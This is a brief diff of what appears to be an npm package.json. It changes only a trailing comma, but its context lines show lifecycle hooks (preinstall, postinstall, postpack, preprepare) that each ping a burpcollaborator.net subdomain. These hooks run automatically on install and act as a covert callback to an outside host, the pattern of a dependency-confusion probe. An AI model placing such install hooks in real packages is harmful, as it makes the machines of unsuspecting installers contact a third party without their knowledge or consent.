@@ -18,6 +18,6 @@
     "postpack": "ping xxxxxxxxx.9r1onccy4ndut97zi9gtvopmhdn5bu.burpcollaborator.net",
     "preinstall": "ping x1.9r1onccy4ndut97zi9gtvopmhdn5bu.burpcollaborator.net",
     "postinstall": "ping x2.9r1onccy4ndut97zi9gtvopmhdn5bu.burpcollaborator.net",
-    "preprepare": "ping x3.9r1onccy4ndut97zi9gtvopmhdn5bu.burpcollaborator.net",
+    "preprepare": "ping x3.9r1onccy4ndut97zi9gtvopmhdn5bu.burpcollaborator.net"
   }
 }
